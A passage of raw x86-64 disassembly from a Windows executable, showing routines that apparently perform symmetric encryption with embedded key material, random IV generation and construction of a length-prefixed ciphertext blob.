   140001ede:	66 90                	xchg   %ax,%ax
   140001ee0:	41 55                	push   %r13
   140001ee2:	41 54                	push   %r12
   140001ee4:	55                   	push   %rbp
   140001ee5:	57                   	push   %rdi
   140001ee6:	56                   	push   %rsi
   140001ee7:	53                   	push   %rbx
   140001ee8:	48 83 ec 68          	sub    $0x68,%rsp
   140001eec:	48 89 cd             	mov    %rcx,%rbp
   140001eef:	41 89 d4             	mov    %edx,%r12d
   140001ef2:	4c 89 c6             	mov    %r8,%rsi
   140001ef5:	48 c7 44 24 50 00 00 	movq   $0x0,0x50(%rsp)
   140001efc:	00 00 
   140001efe:	45 31 c0             	xor    %r8d,%r8d
   140001f01:	44 89 cf             	mov    %r9d,%edi
   140001f04:	41 b9 08 00 00 00    	mov    $0x8,%r9d
   140001f0a:	48 c7 44 24 58 00 00 	movq   $0x0,0x58(%rsp)
   140001f11:	00 00 
   140001f13:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140001f18:	c7 44 24 48 00 00 00 	movl   $0x0,0x48(%rsp)
   140001f1f:	00 
   140001f20:	48 8d 15 9f 21 01 00 	lea    0x1219f(%rip),%rdx        # 0x1400140c6
   140001f27:	c7 44 24 4c 00 00 00 	movl   $0x0,0x4c(%rsp)
   140001f2e:	00 
   140001f2f:	e8 74 31 00 00       	call   0x1400050a8
   140001f34:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140001f39:	48 8d 44 24 4c       	lea    0x4c(%rsp),%rax
   140001f3e:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   140001f44:	4c 8d 44 24 48       	lea    0x48(%rsp),%r8
   140001f49:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
   140001f50:	00 
   140001f51:	48 8d 15 7c 21 01 00 	lea    0x1217c(%rip),%rdx        # 0x1400140d4
   140001f58:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001f5d:	e8 56 31 00 00       	call   0x1400050b8
   140001f62:	8b 5c 24 48          	mov    0x48(%rsp),%ebx
   140001f66:	4c 8b 2d 1b a7 01 00 	mov    0x1a71b(%rip),%r13        # 0x14001c688
   140001f6d:	41 ff d5             	call   *%r13
   140001f70:	31 d2                	xor    %edx,%edx
   140001f72:	48 89 c1             	mov    %rax,%rcx
   140001f75:	49 89 d8             	mov    %rbx,%r8
   140001f78:	ff 15 3a a7 01 00    	call   *0x1a73a(%rip)        # 0x14001c6b8
   140001f7e:	44 8b 4c 24 48       	mov    0x48(%rsp),%r9d
   140001f83:	48 8d 54 24 58       	lea    0x58(%rsp),%rdx
   140001f88:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
   140001f8f:	00 
   140001f90:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140001f95:	49 89 c0             	mov    %rax,%r8
   140001f98:	44 89 64 24 28       	mov    %r12d,0x28(%rsp)
   140001f9d:	48 89 c3             	mov    %rax,%rbx
   140001fa0:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   140001fa5:	e8 4e 31 00 00       	call   0x1400050f8
   140001faa:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140001faf:	45 31 c9             	xor    %r9d,%r9d
   140001fb2:	41 89 f8             	mov    %edi,%r8d
   140001fb5:	48 89 f2             	mov    %rsi,%rdx
   140001fb8:	e8 f3 30 00 00       	call   0x1400050b0
   140001fbd:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140001fc2:	45 31 c9             	xor    %r9d,%r9d
   140001fc5:	41 b8 20 00 00 00    	mov    $0x20,%r8d
   140001fcb:	48 8b 94 24 c0 00 00 	mov    0xc0(%rsp),%rdx
   140001fd2:	00 
   140001fd3:	e8 f8 30 00 00       	call   0x1400050d0
   140001fd8:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140001fdd:	48 85 c9             	test   %rcx,%rcx
   140001fe0:	74 05                	je     0x140001fe7
   140001fe2:	e8 01 31 00 00       	call   0x1400050e8
   140001fe7:	48 85 db             	test   %rbx,%rbx
   140001fea:	74 11                	je     0x140001ffd
   140001fec:	41 ff d5             	call   *%r13
   140001fef:	49 89 d8             	mov    %rbx,%r8
   140001ff2:	31 d2                	xor    %edx,%edx
   140001ff4:	48 89 c1             	mov    %rax,%rcx
   140001ff7:	ff 15 c3 a6 01 00    	call   *0x1a6c3(%rip)        # 0x14001c6c0
   140001ffd:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140002002:	48 85 c9             	test   %rcx,%rcx
   140002005:	74 08                	je     0x14000200f
   140002007:	31 d2                	xor    %edx,%edx
   140002009:	e8 f2 30 00 00       	call   0x140005100
   14000200e:	90                   	nop
   14000200f:	48 83 c4 68          	add    $0x68,%rsp
   140002013:	5b                   	pop    %rbx
   140002014:	5e                   	pop    %rsi
   140002015:	5f                   	pop    %rdi
   140002016:	5d                   	pop    %rbp
   140002017:	41 5c                	pop    %r12
   140002019:	41 5d                	pop    %r13
   14000201b:	c3                   	ret
   14000201c:	0f 1f 40 00          	nopl   0x0(%rax)
   140002020:	41 56                	push   %r14
   140002022:	41 55                	push   %r13
   140002024:	41 54                	push   %r12
   140002026:	55                   	push   %rbp
   140002027:	57                   	push   %rdi
   140002028:	56                   	push   %rsi
   140002029:	53                   	push   %rbx
   14000202a:	48 83 c4 80          	add    $0xffffffffffffff80,%rsp
   14000202e:	f3 0f 6f 02          	movdqu (%rdx),%xmm0
   140002032:	48 89 cb             	mov    %rcx,%rbx
   140002035:	48 89 d7             	mov    %rdx,%rdi
   140002038:	4c 89 c5             	mov    %r8,%rbp
   14000203b:	0f 29 44 24 70       	movaps %xmm0,0x70(%rsp)
   140002040:	45 31 c0             	xor    %r8d,%r8d
   140002043:	45 89 cc             	mov    %r9d,%r12d
   140002046:	45 31 c9             	xor    %r9d,%r9d
   140002049:	48 c7 44 24 60 00 00 	movq   $0x0,0x60(%rsp)
   140002050:	00 00 
   140002052:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140002057:	c7 44 24 54 00 00 00 	movl   $0x0,0x54(%rsp)
   14000205e:	00 
   14000205f:	48 8d 15 88 20 01 00 	lea    0x12088(%rip),%rdx        # 0x1400140ee
   140002066:	c7 44 24 58 00 00 00 	movl   $0x0,0x58(%rsp)
   14000206d:	00 
   14000206e:	48 c7 44 24 68 00 00 	movq   $0x0,0x68(%rsp)
   140002075:	00 00 
   140002077:	c7 44 24 5c 00 00 00 	movl   $0x0,0x5c(%rsp)
   14000207e:	00 
   14000207f:	e8 24 30 00 00       	call   0x1400050a8
   140002084:	85 c0                	test   %eax,%eax
   140002086:	0f 88 9c 01 00 00    	js     0x140002228
   14000208c:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140002091:	41 b9 20 00 00 00    	mov    $0x20,%r9d
   140002097:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%rsp)
   14000209e:	00 
   14000209f:	4c 8d 05 52 20 01 00 	lea    0x12052(%rip),%r8        # 0x1400140f8
   1400020a6:	48 8d 15 6b 20 01 00 	lea    0x1206b(%rip),%rdx        # 0x140014118
   1400020ad:	e8 ee 2f 00 00       	call   0x1400050a0
   1400020b2:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   1400020b7:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   1400020bc:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   1400020c2:	4c 8d 44 24 54       	lea    0x54(%rsp),%r8
   1400020c7:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
   1400020ce:	00 
   1400020cf:	48 8d 15 fe 1f 01 00 	lea    0x11ffe(%rip),%rdx        # 0x1400140d4
   1400020d6:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400020db:	e8 d8 2f 00 00       	call   0x1400050b8
   1400020e0:	8b 74 24 54          	mov    0x54(%rsp),%esi
   1400020e4:	4c 8b 2d 9d a5 01 00 	mov    0x1a59d(%rip),%r13        # 0x14001c688
   1400020eb:	41 ff d5             	call   *%r13
   1400020ee:	31 d2                	xor    %edx,%edx
   1400020f0:	48 89 c1             	mov    %rax,%rcx
   1400020f3:	49 89 f0             	mov    %rsi,%r8
   1400020f6:	ff 15 bc a5 01 00    	call   *0x1a5bc(%rip)        # 0x14001c6b8
   1400020fc:	44 8b 4c 24 54       	mov    0x54(%rsp),%r9d
   140002101:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140002106:	48 8d 54 24 68       	lea    0x68(%rsp),%rdx
   14000210b:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140002110:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
   140002117:	00 
   140002118:	49 89 c0             	mov    %rax,%r8
   14000211b:	48 89 c6             	mov    %rax,%rsi
   14000211e:	c7 44 24 28 20 00 00 	movl   $0x20,0x28(%rsp)
   140002125:	00 
   140002126:	e8 95 2f 00 00       	call   0x1400050c0
   14000212b:	85 c0                	test   %eax,%eax
   14000212d:	89 c3                	mov    %eax,%ebx
   14000212f:	0f 88 a3 00 00 00    	js     0x1400021d8
   140002135:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   14000213a:	48 8d 5c 24 70       	lea    0x70(%rsp),%rbx
   14000213f:	45 31 c9             	xor    %r9d,%r9d
   140002142:	45 89 e0             	mov    %r12d,%r8d
   140002145:	4c 8d 74 24 5c       	lea    0x5c(%rsp),%r14
   14000214a:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000214f:	48 89 ea             	mov    %rbp,%rdx
   140002152:	c7 44 24 48 01 00 00 	movl   $0x1,0x48(%rsp)
   140002159:	00 
   14000215a:	4c 89 74 24 40       	mov    %r14,0x40(%rsp)
   14000215f:	c7 44 24 38 00 00 00 	movl   $0x0,0x38(%rsp)
   140002166:	00 
   140002167:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   14000216e:	00 00 
   140002170:	c7 44 24 28 10 00 00 	movl   $0x10,0x28(%rsp)
   140002177:	00 
   140002178:	e8 5b 2f 00 00       	call   0x1400050d8
   14000217d:	8b 44 24 5c          	mov    0x5c(%rsp),%eax
   140002181:	48 89 ea             	mov    %rbp,%rdx
   140002184:	45 31 c9             	xor    %r9d,%r9d
   140002187:	f3 0f 6f 0f          	movdqu (%rdi),%xmm1
   14000218b:	45 89 e0             	mov    %r12d,%r8d
   14000218e:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140002193:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   140002198:	c7 44 24 48 01 00 00 	movl   $0x1,0x48(%rsp)
   14000219f:	00 
   1400021a0:	4c 89 74 24 40       	mov    %r14,0x40(%rsp)
   1400021a5:	89 44 24 38          	mov    %eax,0x38(%rsp)
   1400021a9:	48 8b 84 24 e0 00 00 	mov    0xe0(%rsp),%rax
   1400021b0:	00 
   1400021b1:	c7 44 24 28 10 00 00 	movl   $0x10,0x28(%rsp)
   1400021b8:	00 
   1400021b9:	0f 29 4c 24 70       	movaps %xmm1,0x70(%rsp)
   1400021be:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1400021c3:	e8 10 2f 00 00       	call   0x1400050d8
   1400021c8:	8b 54 24 5c          	mov    0x5c(%rsp),%edx
   1400021cc:	89 c3                	mov    %eax,%ebx
   1400021ce:	48 8b 84 24 e8 00 00 	mov    0xe8(%rsp),%rax
   1400021d5:	00 
   1400021d6:	89 10                	mov    %edx,(%rax)
   1400021d8:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   1400021dd:	48 85 c9             	test   %rcx,%rcx
   1400021e0:	74 05                	je     0x1400021e7
   1400021e2:	e8 f9 2e 00 00       	call   0x1400050e0
   1400021e7:	48 85 f6             	test   %rsi,%rsi
   1400021ea:	74 11                	je     0x1400021fd
   1400021ec:	41 ff d5             	call   *%r13
   1400021ef:	49 89 f0             	mov    %rsi,%r8
   1400021f2:	31 d2                	xor    %edx,%edx
   1400021f4:	48 89 c1             	mov    %rax,%rcx
   1400021f7:	ff 15 c3 a4 01 00    	call   *0x1a4c3(%rip)        # 0x14001c6c0
   1400021fd:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140002202:	48 85 c9             	test   %rcx,%rcx
   140002205:	74 07                	je     0x14000220e
   140002207:	31 d2                	xor    %edx,%edx
   140002209:	e8 f2 2e 00 00       	call   0x140005100
   14000220e:	89 d8                	mov    %ebx,%eax
   140002210:	c1 f8 1f             	sar    $0x1f,%eax
   140002213:	48 83 ec 80          	sub    $0xffffffffffffff80,%rsp
   140002217:	5b                   	pop    %rbx
   140002218:	5e                   	pop    %rsi
   140002219:	5f                   	pop    %rdi
   14000221a:	5d                   	pop    %rbp
   14000221b:	41 5c                	pop    %r12
   14000221d:	41 5d                	pop    %r13
   14000221f:	41 5e                	pop    %r14
   140002221:	c3                   	ret
   140002222:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002228:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   14000222d:	eb e4                	jmp    0x140002213
   14000222f:	90                   	nop
   140002230:	41 54                	push   %r12
   140002232:	55                   	push   %rbp
   140002233:	57                   	push   %rdi
   140002234:	56                   	push   %rsi
   140002235:	53                   	push   %rbx
   140002236:	48 83 c4 80          	add    $0xffffffffffffff80,%rsp
   14000223a:	f3 0f 6f 02          	movdqu (%rdx),%xmm0
   14000223e:	48 8d 15 a9 1e 01 00 	lea    0x11ea9(%rip),%rdx        # 0x1400140ee
   140002245:	48 89 cb             	mov    %rcx,%rbx
   140002248:	4c 89 c5             	mov    %r8,%rbp
   14000224b:	44 89 cf             	mov    %r9d,%edi
   14000224e:	0f 29 44 24 70       	movaps %xmm0,0x70(%rsp)
   140002253:	45 31 c9             	xor    %r9d,%r9d
   140002256:	45 31 c0             	xor    %r8d,%r8d
   140002259:	48 c7 44 24 60 00 00 	movq   $0x0,0x60(%rsp)
   140002260:	00 00 
   140002262:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140002267:	c7 44 24 54 00 00 00 	movl   $0x0,0x54(%rsp)
   14000226e:	00 
   14000226f:	48 c7 44 24 68 00 00 	movq   $0x0,0x68(%rsp)
   140002276:	00 00 
   140002278:	c7 44 24 58 00 00 00 	movl   $0x0,0x58(%rsp)
   14000227f:	00 
   140002280:	c7 44 24 5c 00 00 00 	movl   $0x0,0x5c(%rsp)
   140002287:	00 
   140002288:	e8 1b 2e 00 00       	call   0x1400050a8
   14000228d:	85 c0                	test   %eax,%eax
   14000228f:	0f 88 4b 01 00 00    	js     0x1400023e0
   140002295:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   14000229a:	41 b9 20 00 00 00    	mov    $0x20,%r9d
   1400022a0:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%rsp)
   1400022a7:	00 
   1400022a8:	4c 8d 05 49 1e 01 00 	lea    0x11e49(%rip),%r8        # 0x1400140f8
   1400022af:	48 8d 15 62 1e 01 00 	lea    0x11e62(%rip),%rdx        # 0x140014118
   1400022b6:	e8 e5 2d 00 00       	call   0x1400050a0
   1400022bb:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   1400022c0:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   1400022c5:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   1400022cb:	4c 8d 44 24 54       	lea    0x54(%rsp),%r8
   1400022d0:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
   1400022d7:	00 
   1400022d8:	48 8d 15 f5 1d 01 00 	lea    0x11df5(%rip),%rdx        # 0x1400140d4
   1400022df:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400022e4:	e8 cf 2d 00 00       	call   0x1400050b8
   1400022e9:	8b 74 24 54          	mov    0x54(%rsp),%esi
   1400022ed:	4c 8b 25 94 a3 01 00 	mov    0x1a394(%rip),%r12        # 0x14001c688
   1400022f4:	41 ff d4             	call   *%r12
   1400022f7:	31 d2                	xor    %edx,%edx
   1400022f9:	48 89 c1             	mov    %rax,%rcx
   1400022fc:	49 89 f0             	mov    %rsi,%r8
   1400022ff:	ff 15 b3 a3 01 00    	call   *0x1a3b3(%rip)        # 0x14001c6b8
   140002305:	44 8b 4c 24 54       	mov    0x54(%rsp),%r9d
   14000230a:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000230f:	48 8d 54 24 68       	lea    0x68(%rsp),%rdx
   140002314:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140002319:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
   140002320:	00 
   140002321:	49 89 c0             	mov    %rax,%r8
   140002324:	48 89 c6             	mov    %rax,%rsi
   140002327:	c7 44 24 28 20 00 00 	movl   $0x20,0x28(%rsp)
   14000232e:	00 
   14000232f:	e8 8c 2d 00 00       	call   0x1400050c0
   140002334:	85 c0                	test   %eax,%eax
   140002336:	89 c3                	mov    %eax,%ebx
   140002338:	78 58                	js     0x140002392
   14000233a:	48 8d 44 24 5c       	lea    0x5c(%rsp),%rax
   14000233f:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   140002344:	48 89 ea             	mov    %rbp,%rdx
   140002347:	45 31 c9             	xor    %r9d,%r9d
   14000234a:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   14000234f:	48 8b 84 24 d0 00 00 	mov    0xd0(%rsp),%rax
   140002356:	00 
   140002357:	41 89 f8             	mov    %edi,%r8d
   14000235a:	c7 44 24 48 01 00 00 	movl   $0x1,0x48(%rsp)
   140002361:	00 
   140002362:	89 7c 24 38          	mov    %edi,0x38(%rsp)
   140002366:	c7 44 24 28 10 00 00 	movl   $0x10,0x28(%rsp)
   14000236d:	00 
   14000236e:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140002373:	48 8d 44 24 70       	lea    0x70(%rsp),%rax
   140002378:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000237d:	e8 6e 2d 00 00       	call   0x1400050f0
   140002382:	8b 54 24 5c          	mov    0x5c(%rsp),%edx
   140002386:	89 c3                	mov    %eax,%ebx
   140002388:	48 8b 84 24 d8 00 00 	mov    0xd8(%rsp),%rax
   14000238f:	00 
   140002390:	89 10                	mov    %edx,(%rax)
   140002392:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   140002397:	48 85 c9             	test   %rcx,%rcx
   14000239a:	74 05                	je     0x1400023a1
   14000239c:	e8 3f 2d 00 00       	call   0x1400050e0
   1400023a1:	48 85 f6             	test   %rsi,%rsi
   1400023a4:	74 11                	je     0x1400023b7
   1400023a6:	41 ff d4             	call   *%r12
   1400023a9:	49 89 f0             	mov    %rsi,%r8
   1400023ac:	31 d2                	xor    %edx,%edx
   1400023ae:	48 89 c1             	mov    %rax,%rcx
   1400023b1:	ff 15 09 a3 01 00    	call   *0x1a309(%rip)        # 0x14001c6c0
   1400023b7:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   1400023bc:	48 85 c9             	test   %rcx,%rcx
   1400023bf:	74 07                	je     0x1400023c8
   1400023c1:	31 d2                	xor    %edx,%edx
   1400023c3:	e8 38 2d 00 00       	call   0x140005100
   1400023c8:	89 d8                	mov    %ebx,%eax
   1400023ca:	c1 f8 1f             	sar    $0x1f,%eax
   1400023cd:	48 83 ec 80          	sub    $0xffffffffffffff80,%rsp
   1400023d1:	5b                   	pop    %rbx
   1400023d2:	5e                   	pop    %rsi
   1400023d3:	5f                   	pop    %rdi
   1400023d4:	5d                   	pop    %rbp
   1400023d5:	41 5c                	pop    %r12
   1400023d7:	c3                   	ret
   1400023d8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400023df:	00 
   1400023e0:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1400023e5:	eb e6                	jmp    0x1400023cd
   1400023e7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400023ee:	00 00 
   1400023f0:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   1400023f6:	41 89 d0             	mov    %edx,%r8d
   1400023f9:	48 89 ca             	mov    %rcx,%rdx
   1400023fc:	31 c9                	xor    %ecx,%ecx
   1400023fe:	e9 c5 2c 00 00       	jmp    0x1400050c8
   140002403:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   14000240a:	00 00 00 00 
   14000240e:	66 90                	xchg   %ax,%ax
   140002410:	41 57                	push   %r15
   140002412:	41 56                	push   %r14
   140002414:	41 55                	push   %r13
   140002416:	41 54                	push   %r12
   140002418:	55                   	push   %rbp
   140002419:	57                   	push   %rdi
   14000241a:	56                   	push   %rsi
   14000241b:	53                   	push   %rbx
   14000241c:	48 81 ec c8 00 00 00 	sub    $0xc8,%rsp
   140002423:	4c 8d 25 0e 1d 01 00 	lea    0x11d0e(%rip),%r12        # 0x140014138
   14000242a:	49 8d 6c 24 40       	lea    0x40(%r12),%rbp
   14000242f:	48 8d 35 8a 1c 01 00 	lea    0x11c8a(%rip),%rsi        # 0x1400140c0
   140002436:	48 89 8c 24 10 01 00 	mov    %rcx,0x110(%rsp)
   14000243d:	00 
   14000243e:	48 8d bc 24 80 00 00 	lea    0x80(%rsp),%rdi
   140002445:	00 
   140002446:	48 89 94 24 18 01 00 	mov    %rdx,0x118(%rsp)
   14000244d:	00 
   14000244e:	49 89 fd             	mov    %rdi,%r13
   140002451:	4c 89 84 24 20 01 00 	mov    %r8,0x120(%rsp)
   140002458:	00 
   140002459:	48 8d 9c 24 a0 00 00 	lea    0xa0(%rsp),%rbx
   140002460:	00 
   140002461:	e8 ea 03 01 00       	call   0x140012850
   140002466:	49 89 c6             	mov    %rax,%r14
   140002469:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002470:	4c 89 e1             	mov    %r12,%rcx
   140002473:	49 89 d8             	mov    %rbx,%r8
   140002476:	48 89 f2             	mov    %rsi,%rdx
   140002479:	e8 72 f8 ff ff       	call   0x140001cf0
   14000247e:	8b 84 24 a0 00 00 00 	mov    0xa0(%rsp),%eax
   140002485:	49 83 c4 02          	add    $0x2,%r12
   140002489:	49 83 c5 01          	add    $0x1,%r13
   14000248d:	41 88 45 ff          	mov    %al,-0x1(%r13)
   140002491:	49 39 ec             	cmp    %rbp,%r12
   140002494:	75 da                	jne    0x140002470
   140002496:	4c 8d 2d e3 1c 01 00 	lea    0x11ce3(%rip),%r13        # 0x140014180
   14000249d:	4c 8d 64 24 60       	lea    0x60(%rsp),%r12
   1400024a2:	49 8d 6d 30          	lea    0x30(%r13),%rbp
   1400024a6:	4d 89 e7             	mov    %r12,%r15
   1400024a9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400024b0:	4c 89 e9             	mov    %r13,%rcx
   1400024b3:	49 89 d8             	mov    %rbx,%r8
   1400024b6:	48 89 f2             	mov    %rsi,%rdx
   1400024b9:	e8 32 f8 ff ff       	call   0x140001cf0
   1400024be:	8b 84 24 a0 00 00 00 	mov    0xa0(%rsp),%eax
   1400024c5:	49 83 c5 02          	add    $0x2,%r13
   1400024c9:	49 83 c7 01          	add    $0x1,%r15
   1400024cd:	41 88 47 ff          	mov    %al,-0x1(%r15)
   1400024d1:	49 39 ed             	cmp    %rbp,%r13
   1400024d4:	75 da                	jne    0x1400024b0
   1400024d6:	48 8d 6c 24 50       	lea    0x50(%rsp),%rbp
   1400024db:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   1400024e1:	41 b8 10 00 00 00    	mov    $0x10,%r8d
   1400024e7:	48 89 ea             	mov    %rbp,%rdx
   1400024ea:	31 c9                	xor    %ecx,%ecx
   1400024ec:	e8 d7 2b 00 00       	call   0x1400050c8
   1400024f1:	41 8d 4e 10          	lea    0x10(%r14),%ecx
   1400024f5:	48 63 c9             	movslq %ecx,%rcx
   1400024f8:	e8 13 03 01 00       	call   0x140012810
   1400024fd:	45 89 f1             	mov    %r14d,%r9d
   140002500:	48 89 ea             	mov    %rbp,%rdx
   140002503:	48 89 f9             	mov    %rdi,%rcx
   140002506:	4c 8b 84 24 10 01 00 	mov    0x110(%rsp),%r8
   14000250d:	00 
   14000250e:	48 89 c6             	mov    %rax,%rsi
   140002511:	c7 44 24 4c 00 00 00 	movl   $0x0,0x4c(%rsp)
   140002518:	00 
   140002519:	48 8d 44 24 4c       	lea    0x4c(%rsp),%rax
   14000251e:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140002523:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140002528:	e8 f3 fa ff ff       	call   0x140002020
   14000252d:	85 c0                	test   %eax,%eax
   14000252f:	41 89 c7             	mov    %eax,%r15d
   140002532:	0f 85 01 01 00 00    	jne    0x140002639
   140002538:	4c 63 74 24 4c       	movslq 0x4c(%rsp),%r14
   14000253d:	45 8d 4e 10          	lea    0x10(%r14),%r9d
   140002541:	4c 89 f5             	mov    %r14,%rbp
   140002544:	49 63 c9             	movslq %r9d,%rcx
   140002547:	44 89 4c 24 3c       	mov    %r9d,0x3c(%rsp)
   14000254c:	83 c5 30             	add    $0x30,%ebp
   14000254f:	e8 bc 02 01 00       	call   0x140012810
   140002554:	66 0f 6f 44 24 50    	movdqa 0x50(%rsp),%xmm0
   14000255a:	4d 89 f0             	mov    %r14,%r8
   14000255d:	48 89 f2             	mov    %rsi,%rdx
   140002560:	48 8d 48 10          	lea    0x10(%rax),%rcx
   140002564:	49 89 c5             	mov    %rax,%r13
   140002567:	0f cd                	bswap  %ebp
   140002569:	0f 11 00             	movups %xmm0,(%rax)
   14000256c:	e8 a7 02 01 00       	call   0x140012818
   140002571:	44 8b 4c 24 3c       	mov    0x3c(%rsp),%r9d
   140002576:	4d 89 e8             	mov    %r13,%r8
   140002579:	4c 89 e1             	mov    %r12,%rcx
   14000257c:	ba 18 00 00 00       	mov    $0x18,%edx
   140002581:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140002586:	e8 55 f9 ff ff       	call   0x140001ee0
   14000258b:	4c 89 e9             	mov    %r13,%rcx
   14000258e:	e8 4d 02 01 00       	call   0x1400127e0
   140002593:	45 8d 6e 34          	lea    0x34(%r14),%r13d
   140002597:	49 63 cd             	movslq %r13d,%rcx
   14000259a:	e8 71 02 01 00       	call   0x140012810
   14000259f:	66 0f 6f 4c 24 50    	movdqa 0x50(%rsp),%xmm1
   1400025a5:	4d 89 f0             	mov    %r14,%r8
   1400025a8:	48 89 f2             	mov    %rsi,%rdx
   1400025ab:	89 28                	mov    %ebp,(%rax)
   1400025ad:	48 8d 48 14          	lea    0x14(%rax),%rcx
   1400025b1:	48 89 c3             	mov    %rax,%rbx
   1400025b4:	0f 11 48 04          	movups %xmm1,0x4(%rax)
   1400025b8:	e8 5b 02 01 00       	call   0x140012818
   1400025bd:	48 8b 84 24 a0 00 00 	mov    0xa0(%rsp),%rax
   1400025c4:	00 
   1400025c5:	48 89 f1             	mov    %rsi,%rcx
   1400025c8:	4a 89 44 33 14       	mov    %rax,0x14(%rbx,%r14,1)
   1400025cd:	48 8b 84 24 a8 00 00 	mov    0xa8(%rsp),%rax
   1400025d4:	00 
   1400025d5:	4a 89 44 33 1c       	mov    %rax,0x1c(%rbx,%r14,1)
   1400025da:	48 8b 84 24 b0 00 00 	mov    0xb0(%rsp),%rax
   1400025e1:	00 
   1400025e2:	4a 89 44 33 24       	mov    %rax,0x24(%rbx,%r14,1)
   1400025e7:	48 8b 84 24 b8 00 00 	mov    0xb8(%rsp),%rax
   1400025ee:	00 
   1400025ef:	4a 89 44 33 2c       	mov    %rax,0x2c(%rbx,%r14,1)
   1400025f4:	e8 e7 01 01 00       	call   0x1400127e0
   1400025f9:	48 8b 84 24 18 01 00 	mov    0x118(%rsp),%rax
   140002600:	00 
   140002601:	b9 20 00 00 00       	mov    $0x20,%ecx
   140002606:	48 89 18             	mov    %rbx,(%rax)
   140002609:	48 8b 84 24 20 01 00 	mov    0x120(%rsp),%rax
   140002610:	00 
   140002611:	44 89 28             	mov    %r13d,(%rax)
   140002614:	31 c0                	xor    %eax,%eax
   140002616:	f3 aa                	rep stos %al,(%rdi)
   140002618:	b9 18 00 00 00       	mov    $0x18,%ecx
   14000261d:	4c 89 e7             	mov    %r12,%rdi
   140002620:	f3 aa                	rep stos %al,(%rdi)
   140002622:	44 89 f8             	mov    %r15d,%eax
   140002625:	48 81 c4 c8 00 00 00 	add    $0xc8,%rsp
   14000262c:	5b                   	pop    %rbx
   14000262d:	5e                   	pop    %rsi
   14000262e:	5f                   	pop    %rdi
   14000262f:	5d                   	pop    %rbp
   140002630:	41 5c                	pop    %r12
   140002632:	41 5d                	pop    %r13
   140002634:	41 5e                	pop    %r14
   140002636:	41 5f                	pop    %r15
   140002638:	c3                   	ret
   140002639:	48 89 f1             	mov    %rsi,%rcx
   14000263c:	41 bf ff ff ff ff    	mov    $0xffffffff,%r15d
   140002642:	e8 99 01 01 00       	call   0x1400127e0
   140002647:	eb d9                	jmp    0x140002622
   140002649:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002650:	41 57                	push   %r15
   140002652:	41 56                	push   %r14
   140002654:	41 55                	push   %r13
   140002656:	41 54                	push   %r12
   140002658:	55                   	push   %rbp
   140002659:	57                   	push   %rdi
   14000265a:	56                   	push   %rsi
   14000265b:	53                   	push   %rbx
   14000265c:	48 81 ec b8 00 00 00 	sub    $0xb8,%rsp
   140002663:	83 fa 3f             	cmp    $0x3f,%edx
   140002666:	49 89 cf             	mov    %rcx,%r15
   140002669:	41 89 d5             	mov    %edx,%r13d
   14000266c:	0f 8e 1c 02 00 00    	jle    0x14000288e
   140002672:	48 8d 1d bf 1a 01 00 	lea    0x11abf(%rip),%rbx        # 0x140014138
